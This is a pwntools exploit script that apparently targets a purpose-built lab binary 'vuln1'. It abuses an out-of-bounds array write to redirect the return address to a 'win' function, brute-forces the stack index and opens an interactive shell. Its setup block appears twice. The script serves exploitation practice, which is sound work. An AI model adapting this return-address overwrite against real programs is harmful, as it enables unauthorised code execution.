from pwn import *
import os

# Set up context
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
else:
    binary_path = os.path.abspath('../build/vuln1')
context.binary = ELF(binary_path, checksec=False)

log.info("Starting exploit for vuln1 (Array OOB Write)...")

# Exploit for vuln1: Array Out-of-bounds Write (Ret2Win)
from pwn import *
import os

binary_path = os.path.abspath('../build/vuln1')
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln1 (Array OOB -> Ret2Win)...")

# 1. Address of win
win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")

# 2. Find offset.
# id_sequence is long[3] (24 bytes).
# Stack layout (approx): [id_sequence (24)] [saved_rbp (8)] [ret_addr (8)]
# Index 0, 1, 2 are valid.
# Index 3 -> saved_rbp?
# Index 4 -> ret_addr?
# Let's try index 4, 5. Or rely on GDB locally, but here I'll try 3 thru 6.

offset_index = 4 # Educated guess for [buffer] [rbp] [ret]
# If compiled with specific alignments, could vary.
# Let's run a quick loop to verify or just try likelihood.

for idx in range(3, 8):
    log.info(f"Trying index {idx}...")
    p = process([binary_path, str(idx), str(win_addr)])
    try:
        # We read until "Done" or "Spawning shell" to detect success
        output = p.recvuntil(b"Done\n", timeout=0.1)
        
        # If successfully overwritten, it should print "Spawning shell..."
        # But wait, "Done" is printed BEFORE return. 
        # So we read 'Done\n' then check for shell prompt or output
        
        # Actually, simpler: just try to send a command.
        # But 'vuln1' loop needs check.
        
        # Use a separate test process to verify
        # We can't use recvall() because it blocks until shell closes.
        # We can try to read a line.
        more_output = p.recv(timeout=0.2)
        if b"Spawning shell" in more_output:
            log.success(f"SUCCESS! Shell spawned at index {idx}")
            log.info("Switching to interactive mode...")
            p.interactive()
            break
        p.close()
    except Exception as e:
        p.close()


